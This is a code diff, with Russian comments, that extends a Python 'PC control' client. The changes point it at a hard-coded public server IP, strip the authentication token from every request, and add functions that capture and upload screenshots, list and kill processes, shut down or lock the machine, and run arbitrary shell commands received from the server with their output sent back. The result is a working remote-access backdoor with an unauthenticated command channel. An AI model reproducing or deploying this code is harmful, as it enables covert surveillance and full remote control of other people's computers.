@@ -1,4 +1,4 @@
-# client.py - исправленная версия
+# client.py - исправленная версия с расширенным функционалом
 import requests
 import socket
 import time
@@ -7,17 +7,22 @@ import hashlib
 from threading import Thread
 import uuid
 import sys
+import pyautogui
+import os
+import base64
+import subprocess
+import psutil
+import ctypes
+import json
 
 # Конфигурация
-SERVER_URL = "http://localhost:8080"  # Тестируем на локальной машине
-API_SECRET = "6ff39f9e75475d447411994e94a080c3"    # Должен совпадать с серверным
-UNIQUE_SUFFIX = "PCCTRL"
+SERVER_URL = "http://46.158.7.43:4443"  # Замените на ваш адрес сервера
 
 def generate_device_id():
     """Генерирует уникальный ID устройства"""
     pc_name = platform.node()
     unique_hash = hashlib.md5(str(uuid.getnode()).encode()).hexdigest()[:6].upper()
-    device_id = f"{pc_name}-{UNIQUE_SUFFIX}-{unique_hash}"
+    device_id = f"{pc_name}-{unique_hash}"
     return ''.join(e for e in device_id if e.isalnum() or e == '-')
 
 def get_system_info():
@@ -49,7 +54,6 @@ class PCClient:
                 response = requests.post(
                     f"{SERVER_URL}/register",
                     json=data,
-                    headers={"X-Auth-Token": API_SECRET},
                     timeout=10
                 )
                 
@@ -70,6 +74,41 @@ class PCClient:
                 
         return False
     
+    def take_screenshot(self):
+        """Создание скриншота и отправка на сервер"""
+        try:
+            # Создаем скриншот
+            screenshot = pyautogui.screenshot()
+            
+            # Сохраняем временно
+            temp_file = f"screenshot_{self.device_id}.png"
+            screenshot.save(temp_file)
+            
+            # Читаем файл и кодируем в base64
+            with open(temp_file, "rb") as image_file:
+                encoded_image = base64.b64encode(image_file.read()).decode('utf-8')
+            
+            # Удаляем временный файл
+            os.remove(temp_file)
+            
+            # Отправляем на сервер
+            response = requests.post(
+                f"{SERVER_URL}/upload_screenshot",
+                json={
+                    "device_id": self.device_id,
+                    "image": encoded_image
+                },
+                timeout=30
+            )
+            
+            if response.status_code == 200:
+                print("Скриншот успешно отправлен")
+            else:
+                print(f"Ошибка отправки скриншота: {response.text}")
+                
+        except Exception as e:
+            print(f"Ошибка при создании скриншота: {e}")
+    
     def send_heartbeat(self):
         """Регулярная отправка сигналов активности"""
         while self.running:
@@ -77,7 +116,6 @@ class PCClient:
                 response = requests.post(
                     f"{SERVER_URL}/heartbeat",
                     json={"device_id": self.device_id},
-                    headers={"X-Auth-Token": API_SECRET},
                     timeout=5
                 )
                 
@@ -96,7 +134,6 @@ class PCClient:
             try:
                 response = requests.get(
                     f"{SERVER_URL}/commands?device_id={self.device_id}",
-                    headers={"X-Auth-Token": API_SECRET},
                     timeout=10
                 )
                 
@@ -117,15 +154,76 @@ class PCClient:
         """Выполнение полученной команды"""
         try:
             print(f"Получена команда: {command['command']}")
-            # Здесь реализуйте выполнение команд
-            # Например:
+            result = ""
+            
             if command['command'] == 'screenshot':
                 self.take_screenshot()
+                result = "Скриншот выполнен и отправлен"
+                
             elif command['command'] == 'shutdown':
-                self.shutdown_pc()
+                subprocess.run(["shutdown", "/s", "/t", "0"])
+                result = "Компьютер выключается"
+                
+            elif command['command'] == 'reboot':
+                subprocess.run(["shutdown", "/r", "/t", "0"])
+                result = "Компьютер перезагружается"
+                
+            elif command['command'] == 'lock':
+                ctypes.windll.user32.LockWorkStation()
+                result = "Компьютер заблокирован"
+                
+            elif command['command'] == 'sleep':
+                subprocess.run(["rundll32.exe", "powrprof.dll,SetSuspendState", "0,1,0"])
+                result = "Компьютер переведен в спящий режим"
+                
+            elif command['command'] == 'processes':
+                processes = []
+                for proc in psutil.process_iter(['pid', 'name', 'username']):
+                    processes.append({
+                        'pid': proc.info['pid'],
+                        'name': proc.info['name'],
+                        'user': proc.info['username']
+                    })
+                result = json.dumps(processes, indent=2, ensure_ascii=False)
+                
+            elif command['command'].startswith('killprocess:'):
+                pid = int(command['command'].split(':')[1])
+                try:
+                    p = psutil.Process(pid)
+                    p.terminate()
+                    result = f"Процесс {pid} завершен"
+                except Exception as e:
+                    result = f"Ошибка завершения процесса {pid}: {str(e)}"
+                
+            elif command['command'].startswith('cmd:'):
+                cmd = command['command'].split(':', 1)[1]
+                try:
+                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
+                    result = output
+                except subprocess.CalledProcessError as e:
+                    result = f"Ошибка выполнения команды: {e.output}"
+                
+            # Отправляем результат выполнения команды
+            if result:
+                requests.post(
+                    f"{SERVER_URL}/command_result",
+                    json={
+                        "device_id": self.device_id,
+                        "command_id": command['id'],
+                        "result": result
+                    }
+                )
                 
         except Exception as e:
             print(f"Ошибка выполнения команды: {e}")
+            requests.post(
+                f"{SERVER_URL}/command_result",
+                json={
+                    "device_id": self.device_id,
+                    "command_id": command['id'],
+                    "result": f"Ошибка выполнения команды: {str(e)}"
+                }
+            )
     
     def run(self):
         """Запуск клиента"""
